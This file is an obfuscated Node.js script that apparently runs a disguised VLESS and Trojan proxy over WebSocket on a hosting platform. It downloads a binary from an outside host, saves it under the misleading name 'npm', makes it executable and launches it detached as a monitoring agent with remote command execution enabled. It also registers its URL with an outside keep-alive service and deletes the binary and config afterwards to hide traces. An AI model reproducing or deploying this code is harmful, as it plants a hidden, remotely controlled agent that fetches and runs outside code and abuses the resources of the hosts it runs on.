const _0x1c8a09=_0xea62;(function(_0x430a59,_0x575da8){const _0x468a56=_0xea62,_0x11b018=_0x430a59();while(!![]){try{const _0x2e0fe0=-parseInt(_0x468a56(0x121))/0x1+-parseInt(_0x468a56(0x143))/0x2*(parseInt(_0x468a56(0x18c))/0x3)+-parseInt(_0x468a56(0x12a))/0x4+-parseInt(_0x468a56(0x156))/0x5*(parseInt(_0x468a56(0x18b))/0x6)+parseInt(_0x468a56(0x122))/0x7+parseInt(_0x468a56(0x192))/0x8+parseInt(_0x468a56(0x16e))/0x9;if(_0x2e0fe0===_0x575da8)break;else _0x11b018['push'](_0x11b018['shift']());}catch(_0x327fcc){_0x11b018['push'](_0x11b018['shift']());}}}(_0x1071,0xe0443));const os=require('os'),http=require(_0x1c8a09(0x183)),fs=require('fs'),axios=require(_0x1c8a09(0x17c)),net=require(_0x1c8a09(0x170)),path=require(_0x1c8a09(0x148)),crypto=require(_0x1c8a09(0x130)),{Buffer}=require(_0x1c8a09(0x158)),{exec,execSync}=require(_0x1c8a09(0x17e)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x1c8a09(0x135)]||_0x1c8a09(0x147),NEZHA_SERVER=process[_0x1c8a09(0x149)][_0x1c8a09(0x19a)]||'',NEZHA_PORT=process[_0x1c8a09(0x149)][_0x1c8a09(0x17f)]||'',NEZHA_KEY=process[_0x1c8a09(0x149)][_0x1c8a09(0x168)]||'',DOMAIN=process['env']['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process['env'][_0x1c8a09(0x16a)]||!![],WSPATH=process[_0x1c8a09(0x149)][_0x1c8a09(0x127)]||UUID[_0x1c8a09(0x13f)](0x0,0x8),SUB_PATH=process['env'][_0x1c8a09(0x16f)]||_0x1c8a09(0x151),NAME=process[_0x1c8a09(0x149)][_0x1c8a09(0x186)]||_0x1c8a09(0x176),PORT=process[_0x1c8a09(0x149)][_0x1c8a09(0x12f)]||0x1eb4;function _0x1071(){const _0x286319=['net','get','substr','concat','Server\x20is\x20running\x20on\x20port\x20','application/dns-json','Hug','2096','https://arm64.ssss.nyc.mn/agent','2087','Automatic\x20Access\x20Task\x20added\x20successfully','&fp=chrome&type=ws&host=','axios','join','child_process','NEZHA_PORT','data','split','readUInt8','http','setsid\x20nohup\x20./npm\x20-s\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','NAME','readFile','every','Server','application/json','4100478tidvmY','75mULNKi','arm','finish','pop','reduce','toString','13483976PyqjXF','Hello\x20world!','utf-8','client_secret:\x20','connect','trojan://','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','false','NEZHA_SERVER','Failed\x20to\x20resolve\x20','https://dns.google/resolve?name=','update','length','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','chmod\x20+x\x20npm','1155444JNTerh','2614696OkFICE','write','close','/bin/bash','catch','WSPATH','2053','once','3460836qSKjtQ','arm64','map','unlink','Answer','PORT','crypto','createWriteStream','text/plain','text/html','443','UUID','Status','writeHead','npm\x20is\x20already\x20running,\x20skip\x20running...','arch','message','sha224','true','createHash','pipe','slice','npm\x20running\x20error:','Not\x20Found\x0a','log','83564OtdqGW','asOrganization','url','\x20with\x20all\x20DNS\x20servers','ebaab3ff-03a7-4f82-9f28-693e8a31272f','path','env','https://amd64.ssss.nyc.mn/v1','post','https://arm64.ssss.nyc.mn/v1','--tls','replace','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','utf8','sub','2083','npm\x20is\x20running','end','from','5dkygrO','1.1.1.1','buffer','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','includes','error','https://oooo.serv00.net/add-url','npm','8443','&path=%2F',':443?security=tls&sni=','index.html','hex','test','&type=A','vless://','readUInt16BE','https://amd64.ssss.nyc.mn/agent','NEZHA_KEY','find','AUTO_ACCESS','send','trim','then','23473674iXKsme','SUB_PATH'];_0x1071=function(){return _0x286319;};return _0x1071();}let ISP='';const GetISP=async()=>{const _0x583f5f=_0x1c8a09;try{const _0x3f5c2a=await axios['get']('https://speed.cloudflare.com/meta'),_0x9059e0=_0x3f5c2a[_0x583f5f(0x180)];ISP=(_0x9059e0['country']+'-'+_0x9059e0[_0x583f5f(0x144)])[_0x583f5f(0x14e)](/ /g,'_');}catch(_0x39f0e1){ISP='Unknown';}};GetISP();function _0xea62(_0x3645d7,_0x5bc885){const _0x1071e9=_0x1071();return _0xea62=function(_0xea628,_0x5c1c32){_0xea628=_0xea628-0x11f;let _0x2c5ffa=_0x1071e9[_0xea628];return _0x2c5ffa;},_0xea62(_0x3645d7,_0x5bc885);}const httpServer=http['createServer']((_0x82e63e,_0x3c756a)=>{const _0x3948ff=_0x1c8a09;if(_0x82e63e['url']==='/'){const _0x1df32e=path['join'](__dirname,_0x3948ff(0x161));fs[_0x3948ff(0x187)](_0x1df32e,_0x3948ff(0x150),(_0xf305ee,_0x4435ae)=>{const _0x567806=_0x3948ff;if(_0xf305ee){_0x3c756a[_0x567806(0x137)](0xc8,{'Content-Type':_0x567806(0x133)}),_0x3c756a[_0x567806(0x154)](_0x567806(0x193));return;}_0x3c756a[_0x567806(0x137)](0xc8,{'Content-Type':'text/html'}),_0x3c756a[_0x567806(0x154)](_0x4435ae);});return;}else{if(_0x82e63e[_0x3948ff(0x145)]==='/'+SUB_PATH){const _0x1edf98=_0x3948ff(0x165)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x3948ff(0x17b)+DOMAIN+_0x3948ff(0x15f)+WSPATH+'#'+NAME+'-'+ISP,_0x468b54=_0x3948ff(0x197)+UUID+'@'+DOMAIN+_0x3948ff(0x160)+DOMAIN+_0x3948ff(0x17b)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0xd155e1=_0x1edf98+'\x0a'+_0x468b54,_0x3670bf=Buffer[_0x3948ff(0x155)](_0xd155e1)[_0x3948ff(0x191)]('base64');_0x3c756a[_0x3948ff(0x137)](0xc8,{'Content-Type':_0x3948ff(0x132)}),_0x3c756a['end'](_0x3670bf+'\x0a');}else _0x3c756a[_0x3948ff(0x137)](0x194,{'Content-Type':_0x3948ff(0x132)}),_0x3c756a[_0x3948ff(0x154)](_0x3948ff(0x141));}}),wss=new WebSocket[(_0x1c8a09(0x189))]({'server':httpServer}),uuid=UUID[_0x1c8a09(0x14e)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x1c8a09(0x157)];function resolveHost(_0x4f0862){return new Promise((_0x60b7ae,_0x59bbd3)=>{const _0x3dbddf=_0xea62;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3dbddf(0x163)](_0x4f0862)){_0x60b7ae(_0x4f0862);return;}let _0x479a77=0x0;function _0x46b449(){const _0x2d37ef=_0x3dbddf;if(_0x479a77>=DNS_SERVERS[_0x2d37ef(0x19e)]){_0x59bbd3(new Error(_0x2d37ef(0x19b)+_0x4f0862+_0x2d37ef(0x146)));return;}const _0xa47e4b=DNS_SERVERS[_0x479a77];_0x479a77++;const _0xa65c63=_0x2d37ef(0x19c)+encodeURIComponent(_0x4f0862)+_0x2d37ef(0x164);axios[_0x2d37ef(0x171)](_0xa65c63,{'timeout':0x1388,'headers':{'Accept':_0x2d37ef(0x175)}})['then'](_0x4dafde=>{const _0x8921a3=_0x2d37ef,_0x16c2c5=_0x4dafde[_0x8921a3(0x180)];if(_0x16c2c5[_0x8921a3(0x136)]===0x0&&_0x16c2c5[_0x8921a3(0x12e)]&&_0x16c2c5[_0x8921a3(0x12e)][_0x8921a3(0x19e)]>0x0){const _0x587a81=_0x16c2c5[_0x8921a3(0x12e)][_0x8921a3(0x169)](_0x4a9238=>_0x4a9238['type']===0x1);if(_0x587a81){_0x60b7ae(_0x587a81['data']);return;}}_0x46b449();})[_0x2d37ef(0x126)](_0x33014c=>{_0x46b449();});}_0x46b449();});}function handleVlessConnection(_0x2be5b0,_0x5b9770){const _0x2814c3=_0x1c8a09,[_0x4c09cb]=_0x5b9770,_0x3a23f6=_0x5b9770[_0x2814c3(0x13f)](0x1,0x11);if(!_0x3a23f6[_0x2814c3(0x188)]((_0x5001c6,_0xab8d8a)=>_0x5001c6==parseInt(uuid['substr'](_0xab8d8a*0x2,0x2),0x10)))return![];let _0x28878d=_0x5b9770[_0x2814c3(0x13f)](0x11,0x12)[_0x2814c3(0x182)]()+0x13;const _0x1a3737=_0x5b9770[_0x2814c3(0x13f)](_0x28878d,_0x28878d+=0x2)[_0x2814c3(0x166)](0x0),_0x1d0e81=_0x5b9770[_0x2814c3(0x13f)](_0x28878d,_0x28878d+=0x1)[_0x2814c3(0x182)](),_0x76e44=_0x1d0e81==0x1?_0x5b9770[_0x2814c3(0x13f)](_0x28878d,_0x28878d+=0x4)[_0x2814c3(0x17d)]('.'):_0x1d0e81==0x2?new TextDecoder()['decode'](_0x5b9770[_0x2814c3(0x13f)](_0x28878d+0x1,_0x28878d+=0x1+_0x5b9770[_0x2814c3(0x13f)](_0x28878d,_0x28878d+0x1)[_0x2814c3(0x182)]())):_0x1d0e81==0x3?_0x5b9770[_0x2814c3(0x13f)](_0x28878d,_0x28878d+=0x10)['reduce']((_0x12b4ad,_0x1389a8,_0x143c08,_0x193964)=>_0x143c08%0x2?_0x12b4ad['concat'](_0x193964[_0x2814c3(0x13f)](_0x143c08-0x1,_0x143c08+0x1)):_0x12b4ad,[])[_0x2814c3(0x12c)](_0x59238d=>_0x59238d[_0x2814c3(0x166)](0x0)[_0x2814c3(0x191)](0x10))[_0x2814c3(0x17d)](':'):'';_0x2be5b0[_0x2814c3(0x16b)](new Uint8Array([_0x4c09cb,0x0]));const _0x10250b=createWebSocketStream(_0x2be5b0);return resolveHost(_0x76e44)[_0x2814c3(0x16d)](_0x3bfd97=>{net['connect']({'host':_0x3bfd97,'port':_0x1a3737},function(){const _0x2a51c0=_0xea62;this[_0x2a51c0(0x123)](_0x5b9770[_0x2a51c0(0x13f)](_0x28878d)),_0x10250b['on'](_0x2a51c0(0x15b),()=>{})[_0x2a51c0(0x13e)](this)['on'](_0x2a51c0(0x15b),()=>{})[_0x2a51c0(0x13e)](_0x10250b);})['on']('error',()=>{});})['catch'](_0x114887=>{const _0x30eda5=_0x2814c3;net[_0x30eda5(0x196)]({'host':_0x76e44,'port':_0x1a3737},function(){const _0x3a6bd5=_0x30eda5;this['write'](_0x5b9770[_0x3a6bd5(0x13f)](_0x28878d)),_0x10250b['on'](_0x3a6bd5(0x15b),()=>{})[_0x3a6bd5(0x13e)](this)['on'](_0x3a6bd5(0x15b),()=>{})[_0x3a6bd5(0x13e)](_0x10250b);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x8e440b,_0x18e019){const _0x168b82=_0x1c8a09;try{if(_0x18e019[_0x168b82(0x19e)]<0x3a)return![];const _0x4754fd=_0x18e019[_0x168b82(0x13f)](0x0,0x38)[_0x168b82(0x191)](),_0x2dc346=[UUID];let _0x1dba77=null;for(const _0x30f0f8 of _0x2dc346){const _0x2a807a=crypto[_0x168b82(0x13d)](_0x168b82(0x13b))[_0x168b82(0x19d)](_0x30f0f8)['digest'](_0x168b82(0x162));if(_0x2a807a===_0x4754fd){_0x1dba77=_0x30f0f8;break;}}if(!_0x1dba77)return![];let _0x1dd69f=0x38;_0x18e019[_0x1dd69f]===0xd&&_0x18e019[_0x1dd69f+0x1]===0xa&&(_0x1dd69f+=0x2);const _0x2b3d55=_0x18e019[_0x1dd69f];if(_0x2b3d55!==0x1)return![];_0x1dd69f+=0x1;const _0x5f5c41=_0x18e019[_0x1dd69f];_0x1dd69f+=0x1;let _0x1fdcae,_0x44865e;if(_0x5f5c41===0x1)_0x1fdcae=_0x18e019[_0x168b82(0x13f)](_0x1dd69f,_0x1dd69f+0x4)[_0x168b82(0x17d)]('.'),_0x1dd69f+=0x4;else{if(_0x5f5c41===0x3){const _0x3e973c=_0x18e019[_0x1dd69f];_0x1dd69f+=0x1,_0x1fdcae=_0x18e019[_0x168b82(0x13f)](_0x1dd69f,_0x1dd69f+_0x3e973c)[_0x168b82(0x191)](),_0x1dd69f+=_0x3e973c;}else{if(_0x5f5c41===0x4)_0x1fdcae=_0x18e019[_0x168b82(0x13f)](_0x1dd69f,_0x1dd69f+0x10)[_0x168b82(0x190)]((_0x55225d,_0x114513,_0x56d582,_0x555312)=>_0x56d582%0x2?_0x55225d[_0x168b82(0x173)](_0x555312['slice'](_0x56d582-0x1,_0x56d582+0x1)):_0x55225d,[])['map'](_0x593fcf=>_0x593fcf[_0x168b82(0x166)](0x0)[_0x168b82(0x191)](0x10))['join'](':'),_0x1dd69f+=0x10;else return![];}}_0x44865e=_0x18e019['readUInt16BE'](_0x1dd69f),_0x1dd69f+=0x2;_0x1dd69f<_0x18e019[_0x168b82(0x19e)]&&_0x18e019[_0x1dd69f]===0xd&&_0x18e019[_0x1dd69f+0x1]===0xa&&(_0x1dd69f+=0x2);const _0x4a573b=createWebSocketStream(_0x8e440b);return resolveHost(_0x1fdcae)[_0x168b82(0x16d)](_0x3027df=>{const _0x1501a4=_0x168b82;net['connect']({'host':_0x3027df,'port':_0x44865e},function(){const _0xd9e523=_0xea62;_0x1dd69f<_0x18e019['length']&&this[_0xd9e523(0x123)](_0x18e019[_0xd9e523(0x13f)](_0x1dd69f)),_0x4a573b['on']('error',()=>{})['pipe'](this)['on'](_0xd9e523(0x15b),()=>{})[_0xd9e523(0x13e)](_0x4a573b);})['on'](_0x1501a4(0x15b),()=>{});})[_0x168b82(0x126)](_0x4cb7fe=>{const _0x2f084b=_0x168b82;net[_0x2f084b(0x196)]({'host':_0x1fdcae,'port':_0x44865e},function(){const _0x171cc3=_0x2f084b;_0x1dd69f<_0x18e019[_0x171cc3(0x19e)]&&this[_0x171cc3(0x123)](_0x18e019[_0x171cc3(0x13f)](_0x1dd69f)),_0x4a573b['on'](_0x171cc3(0x15b),()=>{})[_0x171cc3(0x13e)](this)['on']('error',()=>{})[_0x171cc3(0x13e)](_0x4a573b);})['on'](_0x2f084b(0x15b),()=>{});}),!![];}catch(_0x2cdc33){return![];}}wss['on']('connection',(_0x2a80d4,_0x4131a0)=>{const _0x48d533=_0x1c8a09,_0x2d3a7c=_0x4131a0['url']||'';_0x2a80d4[_0x48d533(0x129)](_0x48d533(0x13a),_0x63fe2e=>{const _0xacd304=_0x48d533;if(_0x63fe2e[_0xacd304(0x19e)]>0x11&&_0x63fe2e[0x0]===0x0){const _0x325b1d=_0x63fe2e[_0xacd304(0x13f)](0x1,0x11),_0x305fa2=_0x325b1d[_0xacd304(0x188)]((_0x475916,_0x1ce0e4)=>_0x475916==parseInt(uuid[_0xacd304(0x172)](_0x1ce0e4*0x2,0x2),0x10));if(_0x305fa2){!handleVlessConnection(_0x2a80d4,_0x63fe2e)&&_0x2a80d4['close']();return;}}!handleTrojanConnection(_0x2a80d4,_0x63fe2e)&&_0x2a80d4[_0xacd304(0x124)]();})['on'](_0x48d533(0x15b),()=>{});});const getDownloadUrl=()=>{const _0x58cf34=_0x1c8a09,_0x417b24=os[_0x58cf34(0x139)]();return _0x417b24===_0x58cf34(0x18d)||_0x417b24===_0x58cf34(0x12b)||_0x417b24==='aarch64'?!NEZHA_PORT?_0x58cf34(0x14c):_0x58cf34(0x178):!NEZHA_PORT?_0x58cf34(0x14a):_0x58cf34(0x167);},downloadFile=async()=>{const _0x585ab2=_0x1c8a09;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x534565=getDownloadUrl(),_0x142dbc=await axios({'method':_0x585ab2(0x171),'url':_0x534565,'responseType':'stream'}),_0x2274ad=fs[_0x585ab2(0x131)]('npm');return _0x142dbc['data'][_0x585ab2(0x13e)](_0x2274ad),new Promise((_0x555d90,_0x448672)=>{const _0x309eb2=_0x585ab2;_0x2274ad['on'](_0x309eb2(0x18e),()=>{const _0x2a5aaf=_0x309eb2;console[_0x2a5aaf(0x142)]('npm\x20download\x20successfully'),exec(_0x2a5aaf(0x120),_0x484d77=>{if(_0x484d77)_0x448672(_0x484d77);_0x555d90();});}),_0x2274ad['on'](_0x309eb2(0x15b),_0x448672);});}catch(_0x3e6976){throw _0x3e6976;}},runnz=async()=>{const _0x5b8907=_0x1c8a09;try{const _0x1e0e30=execSync(_0x5b8907(0x11f),{'encoding':_0x5b8907(0x194)});if(_0x1e0e30[_0x5b8907(0x16c)]()!==''){console[_0x5b8907(0x142)](_0x5b8907(0x138));return;}}catch(_0x1b147f){}await downloadFile();let _0x40f7d4='',_0x2f03ad=[_0x5b8907(0x134),_0x5b8907(0x15e),_0x5b8907(0x177),_0x5b8907(0x179),_0x5b8907(0x152),_0x5b8907(0x128)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x47c213=_0x2f03ad[_0x5b8907(0x15a)](NEZHA_PORT)?_0x5b8907(0x14d):'';_0x40f7d4=_0x5b8907(0x184)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x47c213+_0x5b8907(0x198);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2e2ddc=NEZHA_SERVER[_0x5b8907(0x15a)](':')?NEZHA_SERVER[_0x5b8907(0x181)](':')[_0x5b8907(0x18f)]():'',_0x586a20=_0x2f03ad[_0x5b8907(0x15a)](_0x2e2ddc)?_0x5b8907(0x13c):_0x5b8907(0x199),_0x2cab11=_0x5b8907(0x195)+NEZHA_KEY+_0x5b8907(0x14f)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x586a20+_0x5b8907(0x159)+UUID;fs['writeFileSync']('config.yaml',_0x2cab11);}_0x40f7d4=_0x5b8907(0x185);}else{console[_0x5b8907(0x142)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x40f7d4,{'shell':_0x5b8907(0x125)},_0x544788=>{const _0x507d46=_0x5b8907;if(_0x544788)console[_0x507d46(0x15b)](_0x507d46(0x140),_0x544788);else console['log'](_0x507d46(0x153));});}catch(_0x63f5ed){console['error']('error:\x20'+_0x63f5ed);}};async function addAccessTask(){const _0x3df31d=_0x1c8a09;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2b3ccc='https://'+DOMAIN+'/'+SUB_PATH;try{const _0xb2abdc=await axios[_0x3df31d(0x14b)](_0x3df31d(0x15c),{'url':_0x2b3ccc},{'headers':{'Content-Type':_0x3df31d(0x18a)}});console[_0x3df31d(0x142)](_0x3df31d(0x17a));}catch(_0x351ecf){}}const delFiles=()=>{const _0x50f6b1=_0x1c8a09;fs[_0x50f6b1(0x12d)](_0x50f6b1(0x15d),()=>{}),fs[_0x50f6b1(0x12d)]('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{const _0x3c98e2=_0x1c8a09;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x3c98e2(0x174)+PORT);});
